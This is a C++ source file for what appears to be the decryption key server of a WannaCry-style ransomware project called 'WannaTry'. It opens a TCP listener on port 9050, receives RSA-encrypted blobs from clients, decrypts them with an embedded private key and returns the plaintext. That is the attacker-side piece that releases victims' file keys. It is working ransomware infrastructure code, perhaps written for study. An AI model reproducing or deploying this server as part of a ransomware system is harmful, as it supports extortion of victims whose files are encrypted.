// Server.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "../Common/socktool.h"
#include "../config.h"
#include "../Common/hexdump.h"
#include <Windows.h>
#include "../EZCrypt/EZRSA.h"
#include "../WannaTry/keys.h"
#pragma comment(lib, "ws2_32.lib")

#ifndef DECRYPT_SERVER_PORT
#define DECRYPT_SERVER_PORT "9050"
#endif

#ifndef DEFAULT_BUFLEN
#define DEFAULT_BUFLEN 4096
#endif

BOOL DecryptServer(const CHAR* port);
DWORD WINAPI DecryptServerThread(LPVOID lParam);

INT main(INT argc, CHAR* argv[])
{
	DecryptServer(DECRYPT_SERVER_PORT);
	return 0;
}

BOOL DecryptServer(const CHAR* port)
{
	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;


	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("WSAStartup failed with error: %d\n",
			iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(
		NULL, port,
		&hints,
		&result);
	if (iResult != 0) {
		DEBUG("getaddrinfo failed with error: %d\n",
			iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(
		result->ai_family,
		result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		DEBUG("socket failed with error: %ld\n",
			WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	// set address reuse
	BOOL bReuseaddr = TRUE;
	setsockopt(
		ListenSocket,
		SOL_SOCKET,
		SO_REUSEADDR,
		(const CHAR*)&bReuseaddr,
		sizeof(bReuseaddr));
	// Setup the TCP listening socket
	iResult = bind(
		ListenSocket,
		result->ai_addr,
		(int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		DEBUG("bind failed with error: %d\n",
			WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(
		ListenSocket,
		SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		DEBUG("listen failed with error: %d\n",
			WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Accept a client socket
	while (TRUE) {
		DEBUG("Server waiting...\n");
		ClientSocket = accept(
			ListenSocket,
			NULL,
			NULL);
		if (ClientSocket == INVALID_SOCKET) {
			DEBUG("accept failed with error: %d\n",
				WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
		CreateThread(
			NULL,
			0,
			DecryptServerThread,
			&ClientSocket,
			0,
			NULL);
	}

	closesocket(ListenSocket);
	WSACleanup();
	// No longer need server socket

	return 0;
}

DWORD WINAPI DecryptServerThread(LPVOID lParam)
{
	int iResult;
	SOCKET ClientSocket = *(SOCKET*)lParam;
	// int iSendResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	// Receive until the peer shuts down the connection
	INT iSize = 0;
	DEBUG("Server Recv:\n");
	if (!(iSize = RecvAll(
		ClientSocket,
		recvbuf,
		sizeof(recvbuf),
		0))) {
		DEBUG("server: recv failed with error: %d\n",
			WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return false;
	}
	hexdump((PUCHAR)recvbuf, iSize);
	/////////////////////////////
	// decrypt begin
	/////////////////////////////
	UCHAR abPlain[DEFAULT_BUFLEN];
	ULONG cbPlain;
	PEZRSA pDecRSA = new EZRSA();
	pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		WannaPrivateKey(),
		WannaPrivateKeySize());
	BOOL bResult = pDecRSA->Decrypt(
		(PUCHAR)recvbuf,
		iSize,
		abPlain,
		sizeof(abPlain),
		&cbPlain);
	delete pDecRSA;
	if (!bResult) {
		DEBUG("server: decrypt fails\n");
		closesocket(ClientSocket);
		WSACleanup();
		return false;
	}
	//
	DEBUG("Server Send:\n");
	hexdump((PUCHAR)abPlain, cbPlain);
	if ((cbPlain != SendAll(
		ClientSocket,
		(CHAR*)abPlain,
		cbPlain,
		0))) {
		DEBUG("server: send failed with error: %d\n"
			, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return false;
	}
	/////////////////////////////
	// decrypt done
	/////////////////////////////

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		DEBUG("shutdown failed with error: %d\n",
			WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ClientSocket);

	return 0;
}